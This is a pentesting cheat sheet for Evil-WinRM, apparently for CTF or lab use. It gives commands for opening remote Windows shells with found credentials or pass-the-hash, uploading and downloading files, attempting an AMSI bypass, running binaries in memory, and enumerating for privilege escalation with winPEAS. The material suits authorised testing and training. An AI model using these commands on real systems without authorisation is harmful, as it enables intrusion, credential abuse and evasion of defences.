# 💀 Evil-WinRM Cheat Sheet

**Evil-WinRM** is the standard way to get an interactive shell on Windows via **WinRM** (port **5985** HTTP / **5986** HTTPS) once you have valid creds or an NT hash. It's basically PowerShell remoting for pentesters, with built-in upload/download and script loading.

```bash
# General syntax
evil-winrm -i <target> -u <user> -p <password>
```

> 💡 WinRM must be open and the user must be in **Remote Management Users** (or admin). Check first with `nxc winrm 10.10.10.1 -u user -p pass` ([netexec](../netexec)).

---

## Connecting

| Command | Description |
| --- | --- |
| `evil-winrm -i 10.10.10.1 -u user -p 'pass'` | Connect with a password |
| `evil-winrm -i 10.10.10.1 -u user -H <NThash>` | **Pass-the-Hash** (no password) |
| `evil-winrm -i 10.10.10.1 -u user -p pass -S` | Use HTTPS (port 5986) |
| `evil-winrm -i 10.10.10.1 -u user -p pass -P 5986` | Custom port |
| `evil-winrm ... -s /scripts -e /exes` | Set local dirs for `-s` scripts / `-e` executables |

## Built-in commands (inside the shell)

| Command | Description |
| --- | --- |
| `upload local.exe C:\Temp\local.exe` | Upload a file to the target |
| `download C:\loot.txt loot.txt` | Download a file from the target |
| `menu` | Show loaded functions / available commands |
| `Bypass-4MSI` | Attempt an in-memory AMSI bypass |
| `services` | List services |
| `Invoke-Binary /exes/tool.exe args` | Run a local .NET binary in memory |

## Once you have a shell (PowerShell quick-hits)

| Command | Description |
| --- | --- |
| `whoami /priv` | Your privileges — hunt for `SeImpersonate`, `SeBackup` etc. |
| `whoami /groups` | Group membership |
| `type C:\Users\*\Desktop\*.txt` | Grab flags / files |
| `Get-LocalUser` | Local users |
| `net user /domain` | Domain users |
| `Get-ChildItem -Recurse -Force` | Enumerate files (incl. hidden) |

---

## 🧭 Typical workflow

```bash
# 1. Confirm WinRM access with the creds you found
nxc winrm 10.10.10.1 -u svc -p 'Password1'        # look for (Pwn3d!)

# 2. Drop into a shell
evil-winrm -i 10.10.10.1 -u svc -p 'Password1'

# 3. Check privileges for an easy privesc path
*Evil-WinRM* PS> whoami /priv

# 4. Upload a privesc enum script and run it
*Evil-WinRM* PS> upload winPEAS.exe
*Evil-WinRM* PS> .\winPEAS.exe
```

> 🔗 Get creds/hashes from [netexec](../netexec)/[impacket](../impacket). Privesc once inside → [privesc](../privesc).
